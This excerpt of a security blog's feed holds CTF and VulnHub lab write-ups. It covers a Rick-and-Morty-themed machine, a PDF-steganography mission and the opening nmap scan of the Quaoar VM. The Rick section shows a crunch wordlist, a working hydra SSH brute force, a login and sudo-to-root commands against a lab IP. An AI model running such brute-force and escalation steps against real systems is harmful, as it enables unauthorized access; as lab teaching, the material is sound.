&lt;p&gt;Firsly we know that Rick played in band called “The Flesh Curtains”, so we can extract each of the word into a different password combination. To make wordlists simpler and smaller, I decided to firstly create a list maching this pattern - A-Z:0-9:&amp;lt;one of the 3 words&amp;gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# crunch 5 5 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%The &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; rick.txt
Crunch will now generate the following amount of data: 1560 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@kali:~# crunch 7 7 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%Flesh &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; rick.txt
Crunch will now generate the following amount of data: 2080 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@kali:~# crunch 10 10 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%Curtains &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; rick.txt
Crunch will now generate the following amount of data: 2860 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can run &lt;strong&gt;hydra&lt;/strong&gt; and crack the password.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; RickSanchez &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; rick.txt ssh://10.0.2.15 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 22222
Hydra v8.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2017 by van Hauser/THC - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes.

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2017-11-01 07:54:44
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Restorefile &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;you have 10 seconds to abort... &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use option &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; to skip waiting&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; from a previous session found, to prevent overwriting, ./hydra.restore
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 780 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:780&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~49 tries per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.0.2.15:22222/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22222][ssh] host: 10.0.2.15   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found
Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2017-11-01 07:55:24&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Got it! &lt;strong&gt;P7Curtains&lt;/strong&gt; is the password, so we can now log in once again.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22222 RickSanchez@10.0.2.15
RickSanchez@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
Permission denied, please try again.
RickSanchez@10.0.2.15'&lt;/span&gt;s password:
Last failed login: Wed Nov  1 22:57:05 AEDT 2017 from 10.0.2.4 on ssh:notty
There were 272 failed login attempts since the last successful login.
Last login: Thu Sep 21 09:45:24 2017
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another directory was just a troll.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ThisDoesntContainAnyFlags/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ThisDoesntContainAnyFlags]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 4
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 ..
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez  95 Aug 18 20:26 NotAFlag.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ThisDoesntContainAnyFlags]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;more NotAFlag.txt
hhHHAaaaAAGgGAh. You totally fell &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;it... Classiiiigihhic.
But seriously this isn&lt;span class=&quot;s1&quot;&gt;'t a flag..&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wait, we can use &lt;strong&gt;sudo&lt;/strong&gt; with Rick’s password to log in as &lt;strong&gt;root&lt;/strong&gt;. That’s awesome.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RickSanchez:
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost RickSanchez]# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 36
dr-xr-x---.  4 root root  191 Aug 25 14:30 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x. 17 root root  236 Aug 18 19:16 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   18 Nov  1 23:02 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   18 Feb 12  2017 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  176 Feb 12  2017 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  176 Feb 12  2017 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  100 Feb 12  2017 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   32 Aug 22 10:16 .lesshst
drwxr-----.  3 root root   19 Aug 21 17:35 .pki
drwx------.  2 root root   25 Aug 22 08:21 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  129 Feb 12  2017 .tcshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   40 Aug 22 07:37 FLAG.txt
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root 1214 Aug 18 18:16 anaconda-ks.cfg
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# more FLAG.txt
FLAG: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Ionic Defibrillator&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 30 points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here’s another flag, giving us a total of &lt;strong&gt;120pts&lt;/strong&gt;. Where are the last 20? Probably port 60000, as we never checked what’s inside.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# telnet 10.0.2.15 60000
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Welcome to Ricks half baked reverse shell...
&lt;span class=&quot;c&quot;&gt;# ls -la&lt;/span&gt;
FLAG.txt
&lt;span class=&quot;c&quot;&gt;# more FLAG.txt&lt;/span&gt;
: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
&lt;span class=&quot;c&quot;&gt;# cat FLAG.txt&lt;/span&gt;
FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Flip the pickle Morty!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And there was the last flag - &lt;strong&gt;130/130pts&lt;/strong&gt;.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-rickdiculouslyeasy/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-rickdiculouslyeasy/</guid>
      </item>
    
      <item>
        <title>Gynvael Polish Mission 010</title>
        <description>&lt;p&gt;Let's get back to work, and as Gynvael started streaming again, his mission should be great start. &lt;/p&gt;

&lt;pre&gt;
MISSION 010            goo.gl/oAdvWe                  DIFFICULTY: ███░░░░░░░ [3/10]
┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅

We've received PDF document, where apparently there's a hidden message.
Would you help us find it?

  https://goo.gl/wgt94W

Good luck!
&lt;/pre&gt;

&lt;p&gt;I started this challenge by looking at the file with a hex editor. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_hex_editor.png&quot; alt=&quot;Hexdump&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few moments of searching, I've found the &lt;b&gt;JFIF&lt;/b&gt; segment and so, the whole structure of &lt;b&gt;JPG&lt;/b&gt; file. From that moment, I think we'll be able to extract it from the PDF and somehow recreate it. &lt;/p&gt;

&lt;p&gt;Quick peek at &lt;a href=&quot;https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format&quot;&gt;Wikipedia&lt;/a&gt; showed that whole JPG file is placed between &lt;code&gt;FF DA&lt;/code&gt; and &lt;code&gt;FF D9&lt;/code&gt; codes. &lt;/p&gt;

&lt;table&gt;&lt;tr&gt;
&lt;th colspan=&quot;3&quot; style=&quot;text-align:left&quot;&gt;JFIF file structure&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Segment&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Code&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SOI&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF D8&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Start of Image&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JFIF-APP0&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 49 46 00 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;see below&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JFXX-APP0&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 58 58 00 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;optional, see below&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td colspan=&quot;3&quot;&gt;… additional marker segments&lt;br /&gt;
(for example SOF, DHT, COM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SOS&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF DA&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Start of Scan&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;compressed image data&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;EOI&lt;/td&gt;
&lt;td&gt;&lt;code&gt;FF D9&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;End of Image&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;Now let's copy everything between these segments and add to a new file. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/hex_image.png&quot; alt=&quot;hex image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Last step is to save this file as JPG image. By the way, here's the flag ;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_flag.jpg&quot; alt=&quot;flag&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 10 Sep 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/gynveal-mission-10-polish/</link>
        <guid isPermaLink="true">http://localhost:4000/gynveal-mission-10-polish/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Quaoar</title>
        <description>&lt;p&gt;Hello everyone, another week, another challenge from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;. This time we're going to work on a short machine called &lt;b&gt;Quaoar&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Quaoar

This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/

Difficulty : Very Easy

Tips:

Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)

Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box

Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing

SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753

You may have issues with VMware&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://www.vulnhub.com/author/viper,475/&quot;&gt;&lt;b&gt;Viper&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/hackfest2016-quaoar,180/&quot;&gt;&lt;b&gt;Quaoar&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Attacker: &lt;b&gt;Kali Linux 192.168.56.103&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;Victim: &lt;b&gt;Quaoar 192.168.56.102&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Let's start by firstly scanning the machine with &lt;b&gt;nmap&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.56.102

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-19 08:24 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating ARP Ping Scan at 08:24
Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 08:24, 0.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Initiating SYN Stealth Scan at 08:24
Scanning 192.168.56.102 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
Discovered open port 80/tcp on 192.168.56.102
Discovered open port 995/tcp on 192.168.56.102
Discovered open port 110/tcp on 192.168.56.102
Discovered open port 22/tcp on 192.168.56.102
Discovered open port 993/tcp on 192.168.56.102
Discovered open port 53/tcp on 192.168.56.102
Discovered open port 139/tcp on 192.168.56.102
Discovered open port 445/tcp on 192.168.56.102
Discovered open port 143/tcp on 192.168.56.102
Completed SYN Stealth Scan at 08:24, 1.43s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 08:24
Scanning 9 services on 192.168.56.102
Completed Service scan at 08:24, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.56.102&lt;/span&gt;
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-176545&lt;/span&gt; microseconds.  Ignoring time.
NSE: Script scanning 192.168.56.102.
Initiating NSE at 08:24
Completed NSE at 08:24, 9.19s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00082s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 991 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES STLS PIPELINING SASL TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:32+00:00; +2h00m00s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE SASL-IR ENABLE more STARTTLS ID have capabilities LOGIN-REFERRALS post-login LOGINDISABLEDA0001 listed LITERAL+ OK IMAP4rev1 Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +2h00m00s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: IDLE SASL-IR AUTH=PLAINA0001 more ID have capabilities LOGIN-REFERRALS post-login listed LITERAL+ OK IMAP4rev1 ENABLE Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING USER SASL(PLAIN) TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
MAC Address: 08:00:27:BB:CE:22 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 198.049 days (since Thu Feb  2 06:14:13 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: QUAOAR, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| Names:
|   QUAOAR&amp;lt;00&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   QUAOAR&amp;lt;03&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   QUAOAR&amp;lt;20&amp;gt;           Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   \x01\x02__MSBROWSE__\x02&amp;lt;01&amp;gt;  Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;1d&amp;gt;        Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;
|   WORKGROUP&amp;lt;1e&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
|_  WORKGROUP&amp;lt;00&amp;gt;        Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP
|_  System time: 2017-08-19T10:24:30-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn'&lt;/span&gt;t support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 192.168.56.102

NSE: Script Post-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;25.33 seconds
           Raw packets sent: 1127 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;51.988KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;47.336KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wow, that's a lot of open ports. I decided to begin from looking at the &lt;b&gt;port 80&lt;/b&gt;. In addition &lt;b&gt;nmap&lt;/b&gt; scan showed disallowed entry, which we have to check out. &lt;/p&gt;

&lt;p&gt;Main directory of the web pages showes only two images. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/quaoar/htp1.png&quot; alt=&quot;Hack_The_Planet_1&quot; class=&quot;img-responsive center-block&quot; /&gt;
&lt;br /&gt;
